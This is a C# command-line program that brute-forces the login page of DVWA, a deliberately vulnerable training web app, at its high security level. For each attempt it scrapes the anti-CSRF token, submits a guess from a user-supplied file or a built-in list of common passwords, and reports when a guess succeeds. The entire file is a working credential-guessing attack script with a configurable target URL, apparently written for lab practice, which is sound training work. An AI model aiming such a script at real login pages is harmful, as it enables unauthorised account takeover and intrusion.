﻿using AngleSharp;
using AngleSharp.Dom;
using System.CommandLine;
using System.Diagnostics.Metrics;
using System.IO;

namespace DVWA_BruteForce_HighSecurity
{
    internal class Program
    {
        private static string[] DefaultPasswordList = {
            "123456",
            "12345678",
            "qwerty",
            "123456789",
            "12345",
            "1234",
            "111111",
            "1234567",
            "password",
            "dragon",
            "123123",
            "baseball",
            "abc123",
            "football",
            "monkey",
            "letmein",
            "shadow",
            "master",
            "666666",
            "qwertyuiop"
        };

        static async Task Main(string[] args)
        {
            var usernameOption = new Option<string>(
                name: "--username",
                description: "The username to use for the login attempts.",
                getDefaultValue: () => "admin");

            var baseUriOption = new Option<string>(
                name: "--url",
                description: "The URL of the login page.",
                getDefaultValue: () => "http://localhost:3000/vulnerabilities/brute/");

            var phpSessIdOption = new Option<string>(
                name: "--phpSessId",
                description: "The PHP Session Id to include with the request headers. " +
                "This can be found by using browser DevTools and inspecting the cookies set by DVWA.")
                { IsRequired = true };

            var passwordListOption = new Option<string>(
                name: "--passwordList",
                description: "The absolute path to a password list file (TXT or CSV). If no file is specified, a default password list is used."); 

            var rootCommand = new RootCommand("C# script for brute forcing the DVWA high-security login page.");
            rootCommand.AddOption(usernameOption);
            rootCommand.AddOption(baseUriOption);
            rootCommand.AddOption(phpSessIdOption);
            rootCommand.AddOption(passwordListOption);

            rootCommand.SetHandler(async (
                usernameValue, 
                baseUriValue, 
                phpSessIdValue, 
                passwordListPathValue) =>
            {
                await BruteForceLogin(usernameValue, baseUriValue, phpSessIdValue, passwordListPathValue);
            },
            usernameOption,
            baseUriOption,
            phpSessIdOption,
            passwordListOption);

            await rootCommand.InvokeAsync(args);
        }

        static async Task BruteForceLogin(string _username, string _targetBaseAddressURI, string _phpSessId, string _passwordListPath)
        {
            // Initialize AngleSharp settings
            IConfiguration config = Configuration.Default;
            IBrowsingContext context = BrowsingContext.New(config);

            var cookieContents = $"PHPSESSID={_phpSessId}; security=high";

            List<string> passwordList = new();
            if(_passwordListPath != null && _passwordListPath.Length != 0)
            {
                passwordList = File.ReadLines(_passwordListPath).ToList();
            }
            else
            {
                passwordList = DefaultPasswordList.ToList();
            }

            using (var httpClient = new HttpClient())
            {
                httpClient.BaseAddress = new Uri(_targetBaseAddressURI);
                httpClient.DefaultRequestHeaders.Add("Cookie", cookieContents);

                foreach (var _password in passwordList)
                {
                    // Make a GET request to the login page and parse for the CSRF token
                    var loginPageResponseBody = await httpClient.GetStringAsync("");
                    var document = await context.OpenAsync(req => req.Content(loginPageResponseBody));
#pragma warning disable CS8602 // Dereference of a possibly null reference.
                    var csrfToken = document.QuerySelector($"input[name='user_token']").GetAttribute("value");
#pragma warning restore CS8602 // Dereference of a possibly null reference.

                    if (csrfToken == null || csrfToken.Length == 0)
                    {
                        Console.WriteLine($"Error - CSRF token could not be parsed from login page (attempted password: {_password}");
                        continue;
                    }

                    var loginAttemptResponseBody = await httpClient.GetStringAsync($"?username={_username}&password={_password}&Login=Login&user_token={csrfToken}");

                    if (loginAttemptResponseBody.Contains("Username and/or password incorrect"))
                    {
                        Console.WriteLine($"Incorrect password ({_password}).");
                    }
                    else if (loginAttemptResponseBody.Contains("Welcome to the password protected area admin"))
                    {
                        Console.WriteLine($"Valid password found: {_password}.");
                        break;
                    }
                    else
                    {
                        Console.WriteLine($"Error - Unexpected webpage response received after attempting login (attempted password: {_password}).");
                    }
                }
            }
        }
    }
}